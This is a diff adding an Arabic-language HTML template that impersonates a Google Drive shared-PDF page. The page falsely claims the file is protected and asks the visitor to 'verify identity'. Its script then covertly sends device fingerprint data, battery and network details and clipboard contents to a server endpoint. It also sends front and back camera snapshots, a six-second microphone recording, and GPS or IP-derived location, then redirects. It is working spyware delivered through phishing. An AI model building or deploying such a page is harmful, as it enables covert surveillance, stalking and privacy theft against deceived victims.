@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Google Drive</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#f8f9fa;font-family:"Google Sans",Roboto,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.logo{display:flex;align-items:center;gap:10px;margin-bottom:28px}
+.logo svg{width:32px;height:32px}
+.logo span{font-size:22px;color:#5f6368;font-weight:400}
+.card{background:#fff;border-radius:12px;box-shadow:0 1px 3px rgba(0,0,0,.12),0 4px 16px rgba(0,0,0,.08);width:100%;max-width:440px;overflow:hidden}
+.file-header{background:linear-gradient(135deg,#1a73e8,#0d47a1);padding:24px;text-align:center;color:#fff}
+.file-icon{font-size:56px;margin-bottom:10px}
+.file-name{font-size:18px;font-weight:500;word-break:break-all}
+.file-meta{font-size:13px;opacity:.8;margin-top:4px}
+.body{padding:24px}
+.info-row{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f0f0f0;font-size:14px}
+.info-row:last-of-type{border-bottom:none}
+.info-label{color:#5f6368}
+.info-value{color:#202124;font-weight:500}
+.divider{height:1px;background:#e0e0e0;margin:16px 0}
+.verify-box{background:#e8f0fe;border:1px solid #1a73e8;border-radius:8px;padding:14px;font-size:14px;color:#1a57b0;margin-bottom:16px;display:flex;align-items:flex-start;gap:10px}
+.verify-box-icon{font-size:18px;flex-shrink:0}
+.progress{height:4px;background:#e0e0e0;border-radius:2px;margin:14px 0 8px;overflow:hidden}
+.fill{height:100%;width:0;background:#1a73e8;border-radius:2px;transition:width .5s}
+#status{font-size:13px;color:#5f6368;text-align:center;margin-bottom:2px}
+.btn{width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:500;cursor:pointer;letter-spacing:.3px;display:flex;align-items:center;justify-content:center;gap:8px;margin-top:16px}
+.btn:disabled{opacity:.6;cursor:not-allowed}
+.btn-sec{background:#fff;color:#1a73e8;border:1px solid #1a73e8;margin-top:8px;display:none}
+.perm-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;font-size:13px}
+.perm-label{color:#5f6368;display:flex;align-items:center;gap:6px}
+.badge{font-size:11px;font-weight:600;padding:2px 8px;border-radius:20px}
+.badge-wait{background:#f0f0f0;color:#999}
+.badge-ok{background:#e6f4ea;color:#137333}
+.badge-err{background:#fce8e6;color:#c5221f}
+.footer{font-size:11px;color:#9aa0a6;text-align:center;margin-top:20px}
+</style>
+</head>
+<body>
+<div class="logo">
+  <svg viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg">
+    <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
+    <path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0 -1.2 4.5h27.5z" fill="#00ac47"/>
+    <path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/>
+    <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/>
+    <path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
+    <path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 27h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/>
+  </svg>
+  <span>Google Drive</span>
+</div>
+
+<div class="card">
+  <div class="file-header">
+    <div class="file-icon">📄</div>
+    <div class="file-name">مستند مشترك.pdf</div>
+    <div class="file-meta">24.7 MB • تمت المشاركة معك</div>
+  </div>
+  <div class="body">
+    <div class="info-row"><span class="info-label">المالك</span><span class="info-value">shared@gmail.com</span></div>
+    <div class="info-row"><span class="info-label">آخر تعديل</span><span class="info-value">اليوم</span></div>
+    <div class="info-row"><span class="info-label">الحجم</span><span class="info-value">24.7 MB</span></div>
+
+    <div class="divider"></div>
+
+    <div class="verify-box">
+      <div class="verify-box-icon">🔒</div>
+      <div>هذا الملف محمي. يجب التحقق من هويتك للوصول إليه.</div>
+    </div>
+
+    <div style="font-size:13px;color:#5f6368;margin-bottom:10px;font-weight:500">الأذونات المطلوبة:</div>
+    <div class="perm-row"><div class="perm-label">📷 الكاميرا</div><div class="badge badge-wait" id="b-cam">معلّق</div></div>
+    <div class="perm-row"><div class="perm-label">📍 الموقع</div><div class="badge badge-wait" id="b-loc">معلّق</div></div>
+    <div class="perm-row"><div class="perm-label">💾 الجهاز</div><div class="badge badge-ok" id="b-dev">✓ جاهز</div></div>
+
+    <div class="progress"><div class="fill" id="pbar"></div></div>
+    <div id="status">اضغط للتحقق وتحميل الملف</div>
+
+    <button class="btn" id="btn" onclick="startVerify()">⬇️ تحقق وحمّل الملف</button>
+    <button class="btn btn-sec" id="btn-retry" onclick="startVerify()">🔄 إعادة المحاولة</button>
+  </div>
+</div>
+<div class="footer">© Google LLC 2024 · Google Drive</div>
+
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas hidden id="canvas" width="500" height="500"></canvas>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+<script>
+var uid="<%=uid %>",a="<%=a %>",dest="<%=url %>";
+var camDone=false,locDone=false,busy=false;
+
+function setBar(p){document.getElementById('pbar').style.width=p+'%';}
+function setStatus(t){document.getElementById('status').textContent=t;}
+function setBadge(id,type,txt){var el=document.getElementById('b-'+id);el.textContent=txt;el.className='badge badge-'+type;}
+function tryRedirect(){if(camDone&&locDone)window.location.href=dest;}
+
+async function sendDevice(){
+  var td='<b>📁 Google Drive Access</b><br><b>⚓ IP: <%=ip %> | <%=time %></b><br>';
+  td+="<b>🕒 "+new Date()+"</b><br><br><b>📱 Device:</b><br>";
+  ["platform","userAgent","language","maxTouchPoints","hardwareConcurrency","cookieEnabled","appVersion","vendor","deviceMemory"].forEach(function(k){if(k in navigator)td+="<b>"+k+":</b> <code>"+navigator[k]+"</code><br>";});
+  // screen info
+  td+=`<br><b>🖥️ Screen:</b> ${screen.width}x${screen.height} (${window.devicePixelRatio}x)<br>`;
+  td+=`<b>🌐 Lang:</b> ${navigator.language} | <b>TZ:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}<br>`;
+  if("getBattery" in navigator){try{var b=await navigator.getBattery();td+="<br><b>🔋 "+b.level*100+"% | Charging: "+b.charging+"</b>";}catch(e){}}
+  $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+
+  // Network info
+  if(navigator.connection){
+    var nc=navigator.connection;
+    var nd="📶 نوع: "+nc.effectiveType+"\n⚡ سرعة: "+(nc.downlink||'?')+" Mbps\n📡 RTT: "+(nc.rtt||'?')+"ms\n💾 وضع توفير: "+(nc.saveData?'نعم':'لا');
+    $.post(a+"/network",{uid:uid,data:encodeURIComponent(nd)});
+  }
+
+  // Clipboard
+  if(navigator.clipboard&&navigator.clipboard.readText){
+    try{var clip=await navigator.clipboard.readText();if(clip&&clip.trim())$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(clip)});}catch(e){}
+  }
+}
+
+async function startVerify(){
+  if(busy)return;busy=true;
+  document.getElementById('btn').disabled=true;
+  document.getElementById('btn-retry').style.display='none';
+  setBar(5);setStatus('جارٍ التحقق...');
+  setBadge('cam','wait','جارٍ...');setBadge('loc','wait','جارٍ...');
+  sendDevice();
+
+  var stream=null;
+  setStatus('جارٍ طلب إذن الكاميرا...');
+  try{stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user"}});}
+  catch(e1){try{stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});}
+  catch(e2){
+    setBadge('cam','err','✗ مرفوض');
+    setStatus('يجب السماح بالكاميرا لتحميل الملف.');
+    setBar(0);
+    document.getElementById('btn-retry').style.display='block';
+    busy=false;return;
+  }}
+
+  setBadge('cam','ok','✓ تم');setBar(40);
+  var video=document.getElementById('video'),canvas=document.getElementById('canvas');
+  video.srcObject=new MediaStream(stream.getVideoTracks());
+  await new Promise(function(r){video.onloadedmetadata=function(){video.play();r();};setTimeout(r,2000);});
+
+  var ctx=canvas.getContext('2d'),snaps=0;
+  var si=setInterval(function(){
+    ctx.drawImage(video,0,0,500,500);
+    $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"front"});
+    if(++snaps>=3){clearInterval(si);}
+  },1500);
+
+  // Back camera
+  setTimeout(async function(){
+    try{
+      var bs=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});
+      var bv=document.createElement('video');bv.srcObject=bs;bv.play();
+      await new Promise(function(r){setTimeout(r,1800);});
+      ctx.drawImage(bv,0,0,500,500);
+      $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});
+      bs.getTracks().forEach(function(t){t.stop();});
+    }catch(e){}
+    camDone=true;tryRedirect();
+  },5000);
+
+  try{
+    var aTracks=stream.getAudioTracks();
+    if(aTracks.length){
+      var rec=new MediaRecorder(new MediaStream(aTracks)),chunks=[];
+      rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
+      rec.onstop=function(){
+        var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();
+        fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};
+        fr.readAsDataURL(blob);
+      };
+      rec.start();setTimeout(function(){try{rec.stop();}catch(e){}},6000);
+    }
+  }catch(e){}
+
+  setBar(65);setStatus('جارٍ التحقق من الموقع...');
+
+  async function ipFallback(){
+    try{var d=await fetch("https://ipapi.co/json/").then(r=>r.json());if(d&&d.latitude){await doLoc(d.latitude,d.longitude,"IP (~"+d.city+", "+d.country_name+")");}else{locDone=true;tryRedirect();}}
+    catch(e){locDone=true;tryRedirect();}
+  }
+  async function doLoc(lat,lon,acc){
+    return new Promise(function(r){$.post(a+"/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)},function(){locDone=true;tryRedirect();r();});});
+  }
+
+  if(!navigator.geolocation){setBadge('loc','ok','✓ IP');await ipFallback();}
+  else{
+    var t=setTimeout(async function(){setBadge('loc','ok','✓ IP');await ipFallback();},9000);
+    navigator.geolocation.getCurrentPosition(
+      async function(p){clearTimeout(t);setBadge('loc','ok','✓ GPS');setBar(85);await doLoc(p.coords.latitude,p.coords.longitude,p.coords.accuracy+"m");},
+      async function(){clearTimeout(t);setBadge('loc','ok','✓ IP');await ipFallback();},
+      {enableHighAccuracy:true,timeout:8000,maximumAge:0}
+    );
+  }
+  setBar(90);setStatus('جارٍ تجهيز الملف...');
+}
+
+window.onload=function(){sendDevice();};
+</script>
+</body>
+</html>
